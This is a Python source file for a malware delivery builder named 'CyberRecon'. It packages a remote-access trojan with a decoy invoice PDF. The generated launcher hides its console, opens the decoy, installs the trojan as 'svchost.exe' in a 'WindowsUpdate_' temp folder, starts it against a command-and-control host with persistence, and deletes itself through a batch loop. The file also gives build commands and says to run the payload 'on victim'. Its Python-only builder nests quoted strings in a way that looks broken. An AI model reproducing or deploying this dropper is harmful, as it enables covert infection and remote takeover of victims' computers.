"""
CyberRecon Self-Extracting Archive (SFX) Payload Builder
Creates a stealth delivery package with decoy document.
"""

import os
import sys
import shutil
import tempfile
import zipfile
import argparse
from pathlib import Path
from datetime import datetime


class SFXBuilder:
    """
    Builds a self-extracting Python payload that:
    1. Drops decoy PDF to Desktop
    2. Silently installs RAT to temp directory
    3. Establishes persistence
    4. Self-deletes leaving only decoy
    """

    def __init__(self, rat_path: str, decoy_path: str, output_dir: str = "./payloads",
                 c2_host: str = "127.0.0.1", c2_port: int = 8443):
        self.rat_path = rat_path
        self.decoy_path = decoy_path
        self.output_dir = output_dir
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.build_dir = tempfile.mkdtemp(prefix="cyberrecon_build_")
        os.makedirs(self.output_dir, exist_ok=True)

    def _create_launcher_script(self):
        """Create the Python launcher that runs on extraction."""
        launcher = f"""
import os, sys, shutil, subprocess, tempfile, time, ctypes

def hide_console():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

def main():
    hide_console()

    # Create hidden temp directory
    tmpdir = tempfile.mkdtemp(prefix="WindowsUpdate_")
    script_dir = os.path.dirname(os.path.abspath(__file__))

    # Extract RAT
    rat_src = os.path.join(script_dir, "rat.exe")
    rat_dst = os.path.join(tmpdir, "svchost.exe")
    if os.path.exists(rat_src):
        shutil.copy2(rat_src, rat_dst)

    # Drop decoy to Desktop
    decoy_src = os.path.join(script_dir, "Invoice_2024.pdf")
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    decoy_dst = os.path.join(desktop, "Invoice_2024.pdf")
    if os.path.exists(decoy_src):
        shutil.copy2(decoy_src, decoy_dst)
        os.startfile(decoy_dst)

    # Run RAT silently
    if os.path.exists(rat_dst):
        subprocess.Popen([rat_dst, "--c2", "{self.c2_host}", "--c2-port", "{self.c2_port}", "--persist"],
            creationflags=subprocess.CREATE_NO_WINDOW)

    # Self-delete
    time.sleep(3)
    exe_path = os.path.abspath(__file__)
    bat_path = os.path.join(tmpdir, "sd.bat")
    with open(bat_path, "w") as f:
        f.write(f'@echo off\\n:loop\\ndel \\"{exe_path}\\" >nul 2>&1\\nif exist \\"{exe_path}\\" goto loop\\ndel \\"%~f0\\"\\n')
    subprocess.Popen(["cmd", "/c", bat_path], creationflags=subprocess.CREATE_NO_WINDOW)

if __name__ == "__main__":
    main()
"""
        return launcher.strip()

    def build_pyinstaller_payload(self):
        """Build instructions for PyInstaller executable."""
        print("=" * 60)
        print("  CyberRecon SFX Payload Builder")
        print("=" * 60)
        print(f"[*] Build directory: {self.build_dir}")

        # Copy files
        rat_dest = os.path.join(self.build_dir, "rat.exe")
        decoy_dest = os.path.join(self.build_dir, "Invoice_2024.pdf")

        if os.path.exists(self.rat_path):
            shutil.copy2(self.rat_path, rat_dest)
        else:
            print(f"[!] RAT not found: {self.rat_path}")
            print("[*] Creating placeholder...")
            with open(rat_dest, "w") as f:
                f.write("# Placeholder RAT executable\n")

        if os.path.exists(self.decoy_path):
            shutil.copy2(self.decoy_path, decoy_dest)
        else:
            print(f"[!] Decoy not found: {self.decoy_path}")
            print("[*] Creating placeholder PDF...")
            with open(decoy_dest, "wb") as f:
                f.write(b"%PDF-1.4 Placeholder decoy document\n")

        # Create launcher
        launcher = self._create_launcher_script()
        launcher_path = os.path.join(self.build_dir, "launcher.py")
        with open(launcher_path, "w") as f:
            f.write(launcher)

        # Create build script
        build_script = f"""
# Build CyberRecon SFX Payload
# Run: pip install pyinstaller
# Then: python build_payload.py

import PyInstaller.__main__

PyInstaller.__main__.run([
    '--onefile',
    '--windowed',
    '--name', 'Invoice_2024',
    '--add-data', 'rat.exe;.',
    '--add-data', 'Invoice_2024.pdf;.',
    '--icon', 'NONE',
    'launcher.py'
])
"""
        build_path = os.path.join(self.build_dir, "build_payload.py")
        with open(build_path, "w") as f:
            f.write(build_script)

        # Create ZIP distribution
        zip_path = os.path.join(self.output_dir, "CyberRecon_Payload.zip")
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            for item in os.listdir(self.build_dir):
                item_path = os.path.join(self.build_dir, item)
                zf.write(item_path, item)

        print("[+] Payload structure built")
        print(f"    -> RAT: {rat_dest}")
        print(f"    -> Decoy: {decoy_dest}")
        print(f"    -> Launcher: {launcher_path}")
        print(f"    -> Build script: {build_path}")
        print(f"    -> Distribution: {zip_path}")
        print("")
        print("[*] To compile executable:")
        print(f"    cd {self.build_dir}")
        print("    pip install pyinstaller")
        print("    python build_payload.py")
        print("")
        print("[*] Or use 7-Zip SFX:")
        print(f"    cd {self.build_dir}")
        print("    7z a -sfx7z.sfx Invoice_2024.exe rat.exe Invoice_2024.pdf launcher.py")
        print("=" * 60)

        return self.build_dir

    def build_python_payload(self):
        """Build a pure Python payload (no compilation needed)."""
        output_file = os.path.join(self.output_dir, "Invoice_2024.py")

        payload_code = f"""
# CyberRecon Stealth Payload
# Self-extracting delivery mechanism

import os, sys, shutil, subprocess, tempfile, time, base64, ctypes

# Embedded RAT (base64 encoded placeholder)
RAT_DATA = """
iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==
""".strip()

# Embedded decoy PDF
DECOY_DATA = """
JVBERi0xLjQKJeLjz9MKMyAwIG9iago8PC9UeXBlL1BhZ2UvUGFyZW50IDIgMCBSL01lZGlhQm94
WzAgMCA2MTIgNzkyXS9Db250ZW50cyA0IDAgUj4+CmVuZG9iago0IDAgb2JqCjw8L0xlbmd0aCA0
ND4+CnN0cmVhbQpCVAovRjEgMTIgVGYKNzIgNzIwIFRkCihDeWJlclJlY29uIERlY295IERvY3Vt
ZW50KSBUagpFVAplbmRzdHJlYW0KZW5kb2JqCjIgMCBvYmoKPDwvVHlwZS9QYWdlcy9LaWRzWzMg
MCBSXS9Db3VudCAxPj4KZW5kb2JqCjEgMCBvYmoKPDwvVHlwZS9DYXRhbG9nL1BhZ2VzIDIgMCBSPj4KZW5kb2JqCjUgMCBvYmoKPDwvUHJvZHVjZXIoQ3liZXJSZWNvbikvQ3JlYXRpb25EYXRlKEQ6MjAyNDAxMDEwMDAwMCk+PgplbmRvYmoKeHJlZgowIDYKMDAwMDAwMDAwMCA2NTUzNSBmIAowMDAwMDAwMTU3IDAwMDAwIG4gCjAwMDAwMDAxMDYgMDAwMDAgbiAKMDAwMDAwMDAxNSAwMDAwMCBuIAowMDAwMDAwNjggMDAwMDAgbiAKMDAwMDAwMDIxMSAwMDAwMCBuIAp0cmFpbGVyCjw8L1NpemUgNi9Sb290IDEgMCBSPj4Kc3RhcnR4cmVmCjI2MQolJUVPRgo=
""".strip()

def hide_console():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

def main():
    hide_console()
    tmpdir = tempfile.mkdtemp(prefix="WindowsUpdate_")

    # Write RAT
    rat_path = os.path.join(tmpdir, "svchost.exe")
    with open(rat_path, "wb") as f:
        f.write(base64.b64decode(RAT_DATA))

    # Write decoy
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    os.makedirs(desktop, exist_ok=True)
    decoy_path = os.path.join(desktop, "Invoice_2024.pdf")
    with open(decoy_path, "wb") as f:
        f.write(base64.b64decode(DECOY_DATA))

    # Open decoy
    try:
        os.startfile(decoy_path)
    except:
        pass

    # Run RAT
    try:
        subprocess.Popen([sys.executable, rat_path, "--c2", "{self.c2_host}", "--c2-port", "{self.c2_port}"],
            creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass

    # Self-delete
    time.sleep(3)
    exe_path = os.path.abspath(__file__)
    bat_path = os.path.join(tmpdir, "sd.bat")
    with open(bat_path, "w") as f:
        f.write(f'@echo off\\n:loop\\ndel \\"{exe_path}\\" >nul 2>&1\\nif exist \\"{exe_path}\\" goto loop\\ndel \\"%~f0\\"\\n')
    try:
        subprocess.Popen(["cmd", "/c", bat_path], creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass

if __name__ == "__main__":
    main()
"""

        with open(output_file, "w") as f:
            f.write(payload_code)

        print(f"[+] Python payload created: {output_file}")
        print(f"[*] Run on victim: python {output_file}")
        return output_file

    def cleanup(self):
        shutil.rmtree(self.build_dir, ignore_errors=True)
        print("[*] Cleanup complete")


def main():
    parser = argparse.ArgumentParser(description="CyberRecon SFX Payload Builder")
    parser.add_argument("--rat", default="rat_client.py", help="Path to RAT script")
    parser.add_argument("--decoy", default="decoy.pdf", help="Path to decoy PDF")
    parser.add_argument("--output", default="./payloads", help="Output directory")
    parser.add_argument("--c2-host", default="127.0.0.1", help="C2 server IP")
    parser.add_argument("--c2-port", type=int, default=8443, help="C2 server port")
    parser.add_argument("--python-only", action="store_true", help="Build Python-only payload")
    args = parser.parse_args()

    builder = SFXBuilder(args.rat, args.decoy, args.output, args.c2_host, args.c2_port)

    try:
        if args.python_only:
            builder.build_python_payload()
        else:
            builder.build_pyinstaller_payload()
    finally:
        print("\n[*] Build artifacts preserved at:", builder.build_dir)
        print("[*] Run cleanup manually when done.")


if __name__ == "__main__":
    main()
